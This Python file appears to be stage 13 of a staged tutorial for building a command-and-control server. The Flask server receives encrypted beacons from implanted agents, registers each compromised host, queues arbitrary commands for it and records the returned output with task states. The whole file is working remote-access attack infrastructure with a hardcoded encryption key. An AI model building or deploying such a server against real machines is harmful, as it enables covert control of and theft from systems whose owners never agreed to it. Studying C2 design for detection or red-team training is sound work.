"""
SERVER — Stage 13 (State Machine Awareness)

Matches: agent/stages/stage13_state_mechine.go

What this adds:
- Server tracks task lifecycle state: queued → sent → completed
- Stores task history per agent
- /tasks/<agent_id> shows task states
"""

import base64, json, os, uuid
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime

app = Flask(__name__)

SECRET_KEY = b"01234567890123456789012345678901"

def encrypt(data):
    aes   = AESGCM(SECRET_KEY)
    nonce = os.urandom(12)
    ct    = aes.encrypt(nonce, json.dumps(data).encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(enc):
    raw       = base64.b64decode(enc)
    nonce, ct = raw[:12], raw[12:]
    aes       = AESGCM(SECRET_KEY)
    return json.loads(aes.decrypt(nonce, ct, None).decode())

agents   = {}
tasks    = {}    # agent_id -> list of task dicts
pending  = {}    # agent_id -> task dict currently queued

# ── Routes ─────────────────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent_id")

    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if agent_id not in agents:
        agents[agent_id] = {"hostname": payload.get("hostname", "?"), "registered": now}
        print(f"[+] New agent: {agent_id}")
    agents[agent_id]["last_seen"] = now

    # Handle output report
    if payload.get("output") and payload.get("task_id"):
        task_id = payload["task_id"]
        for t in tasks.get(agent_id, []):
            if t["id"] == task_id:
                t["status"]   = "completed"
                t["output"]   = payload["output"]
                t["done_at"]  = now
                print(f"\n[OUTPUT task={task_id}]\n{payload['output']}\n{'='*40}")

    # Dispatch next pending task
    task_to_send = None
    if agent_id in pending:
        task_to_send = pending.pop(agent_id)
        task_to_send["status"] = "sent"
        tasks.setdefault(agent_id, []).append(task_to_send)

    return jsonify({"data": encrypt({"task": task_to_send})})

@app.route("/command", methods=["POST"])
def queue_command():
    data     = request.get_json()
    agent_id = data["agent_id"]
    task     = {"id": str(uuid.uuid4()), "cmd": data["cmd"], "status": "queued"}
    pending[agent_id] = task
    print(f"[*] Task queued: {task['cmd']} -> {agent_id}")
    return jsonify({"task_id": task["id"]})

@app.route("/tasks/<agent_id>")
def get_tasks(agent_id):
    return jsonify(tasks.get(agent_id, []))

@app.route("/agents")
def list_agents():
    return jsonify(agents)

if __name__ == "__main__":
    print("[*] Stage 13 server started — task state machine")
    app.run(host="0.0.0.0", port=8080, debug=False)
